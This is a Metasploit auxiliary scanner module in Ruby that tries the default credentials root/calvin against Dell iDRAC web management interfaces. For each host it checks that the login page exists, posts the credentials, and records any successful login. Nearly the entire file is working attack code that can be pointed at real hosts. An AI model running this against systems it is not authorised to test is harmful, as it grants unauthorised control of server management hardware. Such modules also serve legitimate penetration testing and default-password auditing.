##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'Dell iDRAC default Login',
			'Version' => '$Revision$',
			'Description' => %q{This module attempts to login to a iDRAC webserver
				instance using default username and password},
			'Author' =>
				[
					'Cristiano Maruti <cmaruti[at]gmail.com>'
				],
			'References' =>
				[
					['CVE', '1999-0502'] # Weak password
				],
			'License' => MSF_LICENSE
		)
		register_options(
			[Opt::RPORT(443),
			OptString.new('TARGETURI', [true, 'Path to the iDRAC Administration page', '/data/login']),
			OptString.new('USERNAME', [true, 'Login name', 'root']),
			OptString.new('PASSWORD', [true, 'Login credential', 'calvin'])
		], self.class)
	end

	def target_url
		"https://#{vhost}:#{rport}#{datastore['URI']}"
	end

	def run_host(ip)

		print_status("Verifying that login page exists at #{ip}")
		begin
		
			res = send_request_cgi({
				'method' => 'GET',
				'uri' => target_uri.path,
				'SSL' => true
				}, 20)
			
			if (res and res.code == 200 and res.body.to_s.match(/<root>/) != nil)
				print_status("Attempting authentication")
			
				res = send_request_cgi({
						'method' => 'POST',
						'uri' => target_uri.path,
						'SSL' => true,
						'vars_post' => {
							'user' => datastore['USERNAME'],
							'password' => datastore['PASSWORD']
						}
					}, 20)
					
				if (res and res.code == 200 and res.body.to_s.match(/<authResult>0<\/authResult>/) != nil)
					print_good("#{target_url} - SUCCESSFUL login for user '#{datastore['USERNAME']}' with password '#{datastore['PASSWORD']}'")
					report_auth_info(
						:host => ip,
						:port => rport,
						:proto => 'tcp',
						:sname => ('https'),
						:user => datastore['USERNAME'],
						:pass => datastore['PASSWORD'],
						:active => true,
						:source_type => "user_supplied",
						:duplicate_ok => true
					)
				elsif(res and res.code == 200)
					vprint_error("#{target_url} - Dell iDRAC - Failed to login as '#{datastore['USERNAME']}' with password '#{datastore['PASSWORD']}'")
				else
					vprint_error("#{target_url} - Dell iDRAC - Unable to authenticate.")
					return :abort
				end
			else
				print_error("The iDRAC login page does not exist at #{ip}")
			end
		
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE, ::OpenSSL::SSL::SSLError
		end
		
	end

end